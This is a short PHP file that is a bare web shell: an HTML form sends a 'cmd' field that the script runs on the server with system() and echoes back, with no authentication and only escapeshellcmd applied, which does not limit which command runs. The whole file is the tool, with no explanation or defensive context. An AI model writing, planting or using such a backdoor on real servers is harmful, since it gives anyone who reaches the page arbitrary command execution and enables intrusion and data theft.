<?php

   if ($_SERVER["REQUEST_METHOD"] === 'POST'){

    $cmd = escapeshellcmd($_POST["cmd"]);
    echo '<pre>';
    $comando = system($cmd, $retorno);
    echo '</pre>';

   }

?>

<form method="POST">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>